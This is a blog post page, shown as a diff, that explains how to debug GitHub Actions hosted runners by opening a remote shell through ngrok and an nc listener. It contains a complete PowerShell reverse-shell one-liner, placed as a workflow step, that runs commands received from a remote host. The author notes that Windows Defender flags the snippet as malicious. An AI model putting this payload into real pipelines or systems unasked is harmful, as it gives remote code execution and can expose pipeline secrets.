@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html
+  dir="ltr"
+  lang="en"
+  data-theme=""
+><head>
+  <title>
+    Amal Abeygunawardana
+      |
+      Debugging Github Actions on Hosted Runners
+
+
+    
+
+  </title>
+
+  
+  <meta charset="utf-8" /><meta name="generator" content="Hugo 0.68.3" /><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
+  <meta
+    name="description"
+    content="
+      Ideas, tips and tricks... stuff I think worth sharing
+
+
+    "
+  />
+  
+    <meta name="google-site-verification" content="zBULODmFeRWKwciIEqgWP6L0shKn6cgdfW0Wbw5qnR4" />
+  
+  
+  <link
+    rel="stylesheet"
+    href="/css/main.min.5d5d26e71d7c8207fba7dd30f091511718778ca19e34983b6aac1d2cc557cafe.css"
+    integrity="sha256-XV0m5x18ggf7p90w8JFRFxh3jKGeNJg7aqwdLMVXyv4="
+    crossorigin="anonymous"
+    type="text/css"
+  />
+  
+  
+  <link
+    rel="stylesheet"
+    href="/css/markupHighlight.min.67048b099b4a70431e83ffca9723ec650d79e4213f27f0a6595af7c2901fa938.css"
+    integrity="sha256-ZwSLCZtKcEMeg//KlyPsZQ155CE/J/CmWVr3wpAfqTg="
+    crossorigin="anonymous"
+    type="text/css"
+  />
+  
+    
+    
+    <link
+      rel="stylesheet"
+      href="/css/syntax.min.dd5b47689eac4082335c3a7a4540adc5c08f2d9d6d6f6ba76a81e9f1901f0f9f.css"
+      integrity="sha256-3VtHaJ6sQIIzXDp6RUCtxcCPLZ1tb2unaoHp8ZAfD58="
+      crossorigin="anonymous"
+      media="screen"
+    />
+
+  
+  <link
+    rel="stylesheet"
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css"
+    integrity="sha512-+4zCK9k+qNFUR5X+cKL9EIR+ZOhtIloNl9GIKS57V1MyNsYpYcUrUeQc9vNfzsWfV28IaLL3i96P9sdNyeRssA=="
+    crossorigin="anonymous"
+  />
+  
+  <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+
+  <link rel="canonical" href="/posts/debug-github-actions/" />
+
+  
+  
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/anatole-header.min.413f798d8aa82610bef17a5ca1d7e962ec185be395f1aeb3f45d1891af568b65.js"
+    integrity="sha256-QT95jYqoJhC&#43;8XpcodfpYuwYW&#43;OV8a6z9F0Yka9Wi2U="
+    crossorigin="anonymous"
+  ></script>
+
+  
+    
+    
+    <script
+      type="text/javascript"
+      src="/js/anatole-theme-switcher.min.fcf9526f15b3b4e08472de192969ab28a4cdcb32ac94f83e85a8b84e9b45acd2.js"
+      integrity="sha256-/PlSbxWztOCEct4ZKWmrKKTNyzKslPg&#43;hai4TptFrNI="
+      crossorigin="anonymous"
+    ></script>
+
+  
+  <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Debugging Github Actions on Hosted Runners"/>
+<meta name="twitter:description" content="If you have worked with CI/CD tools like Azure Pipelines or GitHub Actions, I am sure you must have encountered situations where &ldquo;it works on your machine, but not on the hosted runner/agent&rdquo;."/>
+
+
+
+  
+
+
+  
+  
+  
+  
+  <script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "articleSection": "posts",
+        "name": "Debugging Github Actions on Hosted Runners",
+        "headline": "Debugging Github Actions on Hosted Runners",
+        "alternativeHeadline": "",
+        "description": "
+      
+        If you have worked with CI\/CD tools like Azure Pipelines or GitHub Actions, I am sure you must have encountered situations where \x26ldquo;it works on your machine, but not on the hosted runner\/agent\x26rdquo;.
+
+
+      
+
+
+    ",
+        "inLanguage": "en-us",
+        "isFamilyFriendly": "true",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/amal.github.io\/posts\/debug-github-actions\/"
+        },
+        "author" : {
+            "@type": "Person",
+            "name": "Amal Abeygunawardana"
+        },
+        "creator" : {
+            "@type": "Person",
+            "name": "Amal Abeygunawardana"
+        },
+        "accountablePerson" : {
+            "@type": "Person",
+            "name": "Amal Abeygunawardana"
+        },
+        "copyrightHolder" : {
+            "@type": "Person",
+            "name": "Amal Abeygunawardana"
+        },
+        "copyrightYear" : "2021",
+        "dateCreated": "2021-09-11T21:37:02.00Z",
+        "datePublished": "2021-09-11T21:37:02.00Z",
+        "dateModified": "2021-09-11T21:37:02.00Z",
+        "publisher":{
+            "@type":"Organization",
+            "name": "Amal Abeygunawardana",
+            "url": "https://amal.github.io/",
+            "logo": {
+                "@type": "ImageObject",
+                "url": "https:\/\/amal.github.io\/favicon-32x32.png",
+                "width":"32",
+                "height":"32"
+            }
+        },
+        "image": 
+      [
+      ]
+
+    ,
+        "url" : "https:\/\/amal.github.io\/posts\/debug-github-actions\/",
+        "wordCount" : "789",
+        "genre" : [ ],
+        "keywords" : [ ]
+    }
+  </script>
+
+
+
+</head>
+<body>
+    <header><div
+  class="page-top 
+    .
+
+  "
+>
+  <a role="button" class="navbar-burger" data-target="navMenu" aria-label="menu" aria-expanded="false">
+    <span aria-hidden="true"></span>
+    <span aria-hidden="true"></span>
+    <span aria-hidden="true"></span>
+  </a>
+  <nav>
+    <ul class="nav__list" id="navMenu">
+      <div class="nav__links">
+        
+        
+          
+          <li>
+            <a
+              
+              href="/"
+              
+              title=""
+              >Home</a
+            >
+          </li>
+
+        
+          
+          <li>
+            <a
+              
+              href="/posts/"
+              
+              title=""
+              >Posts</a
+            >
+          </li>
+
+        
+          
+          <li>
+            <a
+              
+              href="/about/"
+              
+              title=""
+              >About</a
+            >
+          </li>
+
+        
+        
+      </div>
+      <li>
+        
+          <a class="theme-switch" title="Switch Theme">
+            <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+          </a>
+
+        
+      </li>
+    </ul>
+  </nav>
+</div>
+</header>
+    <div class="wrapper">
+      <aside><div
+  class="sidebar
+    .
+
+  "
+>
+  <div class="sidebar__content">
+    <div class="logo-title">
+      <div class="title">
+        <img src="/images/profile.jpg" alt="profile picture" />
+        <h3 title=""><a href="/">Amal Abey</a></h3>
+        <div class="description">
+          <p>Ideas, tips and tricks... stuff I think worth sharing</p>
+        </div>
+      </div>
+    </div>
+    <ul class="social-links">
+      
+        <li>
+          <a href="https://www.linkedin.com/in/amalabey/" rel="me" aria-label="Linkedin">
+            <i class="fab fa-linkedin fa-2x" aria-hidden="true"></i>
+          </a>
+        </li>
+
+      
+        <li>
+          <a href="https://github.com/amalabey" rel="me" aria-label="Github">
+            <i class="fab fa-github fa-2x" aria-hidden="true"></i>
+          </a>
+        </li>
+
+      
+    </ul>
+  </div><footer class="footer footer--sidebar">
+  <div class="by_farbox">
+    <ul class="footer__list">
+      <li class="footer__item">
+        &copy;
+        
+          Amal Abeygunawardana
+          2021
+
+
+        
+      </li>
+      
+    </ul>
+  </div>
+</footer>
+  
+  <script
+    type="text/javascript"
+    src="/js/medium-zoom.min.bdc7b23aff63497a79433b3920b03e2473399d90ad4c2d87cf7c08d33d61966f.js"
+    integrity="sha256-vceyOv9jSXp5Qzs5ILA&#43;JHM5nZCtTC2Hz3wI0z1hlm8="
+    crossorigin="anonymous"
+  ></script>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-FB74TKDZ9C"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag() {
+    dataLayer.push(arguments);
+  }
+  gtag('js', new Date());
+  gtag('config', 'G-FB74TKDZ9C');
+</script>
+</div>
+</aside>
+      <main>
+        <div class="autopagerize_page_element">
+          <div class="content">
+  <div
+    class="post 
+      .
+
+    "
+  >
+    <div class="post-content">
+      
+      <div class="post-title">
+        <h1>Debugging Github Actions on Hosted Runners</h1>
+        
+          <div class="info">
+            <em class="fas fa-calendar-day"></em>
+            <span class="date"
+              >
+                Sat, Sep 11, 2021
+
+
+              </span
+            >
+            <em class="fas fa-stopwatch"></em>
+            <span class="reading-time">4-minute read</span>
+          </div>
+
+        
+      </div><p>If you have worked with CI/CD tools like Azure Pipelines or GitHub Actions, I am sure you must have encountered situations where &ldquo;it works on your machine, but not on the hosted runner/agent&rdquo;. Rarely a pipeline works on the first run. Even if that&rsquo;s the case, it is too good to be true. I found myself spending a lot of time troubleshooting pipelines/workflows until I get them right. Once I get them right, the journey from there is usually smooth. Do what hurts the most, often, right? and you will get better at it.</p>
+<p>However, this troubleshooting could get really complicated and there were many times I wished we had some tooling support to debug our pipelines. If you are using self-hosted runners, this is not so much a problem because you have access to the runner environment. GitHub hosted runners, however, makes things a lot more complicated. They are short-lived ephemeral VMs that are provisioned just for the pipeline run and destroyed soon after.</p>
+<p>So, here&rsquo;s a technique that will allow you to, put a breakpoint in your workflow so that when the workflow hits the breakpoint, you can get a remote shell into the runner. Once you&rsquo;ve got remote shell access, opportunities are endless.</p>
+<h3 id="clientdeveloper-machine-setup">Client/Developer Machine Setup</h3>
+<p>All you need is a Linux machine with <code>nc</code> utility. Netcat (nc) is a Linux tool that allows you to deal with low-level streams with a lot of flexibility. If you are on Windows, WSL2 should work as well. Here are the steps:</p>
+<ol>
+<li>
+<p><strong>Install <code>ngrok</code> utility</strong><br>
+If you haven&rsquo;t used ngrok before, refer to the instructions <a href="https://ngrok.com/download">here</a> to download <code>ngrok</code>. Its a simple utility that allows you to forward a port over a local tunnel into an internet-accessible endpoint. You may also need to set up an authcode so that you can forward raw TCP connections.</p>
+</li>
+<li>
+<p><strong>Forward a local  port with <code>ngrok</code></strong><br>
+We are going to use <code>nc</code> to listen on a local port to get a reverse shell into the runner. So, run below on a new terminal to forward the local port 443 with ngrok:<br>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">./ngrok tcp <span class="m">443</span></code></pre></div></p>
+</li>
+</ol>
+<p><strong>Note</strong>: <em>note down the remote internet server name and port, because you will need that later (as shown below)</em></p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">Forwarding                    tcp://x.tcp.ngrok.io:12345 -&gt; localhost:443
+</code></pre></div><ol start="3">
+<li><strong>Listen on 443 for the reverse shell</strong><br>
+Use <code>nc</code> to listen in on port 443 for the reverse shell connection from the hosted runner on a new terminal window.
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">nc -lvp <span class="m">443</span></code></pre></div></li>
+</ol>
+<h3 id="breakpoint-on-the-workflowpipeline">Breakpoint on the workflow/pipeline</h3>
+<p>We call it breakpoint, but its really a PowerShell action/step that causes the workflow to pause and initiate the reverse shell connection. Include below step/action anywhere in your workflow that you would like it to pause. Be sure to include correct remote server name and port below, from the ngrok command above step #2.
+<div class="highlight"><pre class="chroma"><code class="language-yaml" data-lang="yaml"><span class="w">  </span>- <span class="k">name</span><span class="p">:</span><span class="w"> </span>reverse<span class="w"> </span>shell<span class="w">
+</span><span class="w">    </span><span class="k">run</span><span class="p">:</span><span class="w"> </span><span class="sd">|
+</span><span class="sd">    $client = New-Object System.Net.Sockets.TCPClient(&#39;&lt;ngrok-remote-name&gt;&#39;,&lt;ngrok-remote-port&gt;);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()</span><span class="w">
+</span><span class="w">    </span><span class="k">shell</span><span class="p">:</span><span class="w"> </span>pwsh</code></pre></div></p>
+<p>That&rsquo;s it. Run the workflow and you will notice it pauses at the &lsquo;reverse shell&rsquo; action. Now, you won&rsquo;t notice it but you have got a reverse shell into the hosted runner on the terminal window you ran <code>nc</code>. Try typing <code>ls</code> and hit enter on that terminal, you will see the output from the runner. Now, you got yourself a shell for any troubleshooting you may want to do. Once you are done, exit <code>nc</code> command and the workflow will resume.</p>
+<h3 id="did-we-just-hack-the-hosted-runner">Did we just hack the hosted runner?</h3>
+<p>Yes and No. If you run that PowerShell snippet to initiate the reverse shell on your Windows machine, Defender will block it and say it prevented malicious code. Besides, anyone with a decent understanding on security would freak out when they hear the term &ldquo;reverse shell&rdquo;. Yes, it is a hacking technique, but in our situation its completely harmless use; if you know how runners/agents work. GitHub Actions runners or Azure Pipelines agents are short-lived VMs created just for you, just for the duration of that pipeline run. So, you are allowed to run arbitrary code and probably why the Defender is not running there in the first place. So, no we didn&rsquo;t hack into the runner, because its a complete sandbox dedicated to my pipeline run.</p>
+<p>Although, above predominantly talks about GitHub Actions, the technique works for Azure Pipelines as well. Hope this helps.</p>
+<p><em>Similar Solutions</em>:</p>
+<ul>
+<li><a href="https://github.com/marketplace/actions/debugging-with-tmate">Debugging with tmate Action</a>: Looks simple enough, but relies on tmate which is similar to ngrok+nc combination.</li>
+<li><a href="https://github.com/marketplace/actions/debug-via-ssh">Debug via SSH Action</a>: Instead of a reverse shell, it seems to use SSH forwarding. I was unsure if it works on Windows runners, but the action claims it works on Windows as well.</li>
+</ul>
+</div>
+    <div class="post-footer">
+      <div class="info">
+        
+
+        
+      </div>
+    </div>
+
+    <div id="fb_comments_container">
+          <h2>comments</h2>
+          <script
+  src="https://utteranc.es/client.js"
+  repo="amalabey/amalabey.github.io"
+  issue-term="pathname"
+  theme="github-light"
+  
+  crossorigin="anonymous"
+  async
+></script>
+
+        </div>
+  </div>
+
+
+          </div>
+        </div>
+      </main>
+    </div><footer class="footer footer--base">
+  <div class="by_farbox">
+    <ul class="footer__list">
+      <li class="footer__item">
+        &copy;
+        
+          Amal Abeygunawardana
+          2021
+
+
+        
+      </li>
+      
+    </ul>
+  </div>
+</footer>
+  
+  <script
+    type="text/javascript"
+    src="/js/medium-zoom.min.bdc7b23aff63497a79433b3920b03e2473399d90ad4c2d87cf7c08d33d61966f.js"
+    integrity="sha256-vceyOv9jSXp5Qzs5ILA&#43;JHM5nZCtTC2Hz3wI0z1hlm8="
+    crossorigin="anonymous"
+  ></script>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-FB74TKDZ9C"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag() {
+    dataLayer.push(arguments);
+  }
+  gtag('js', new Date());
+  gtag('config', 'G-FB74TKDZ9C');
+</script>
+</body>
+</html>
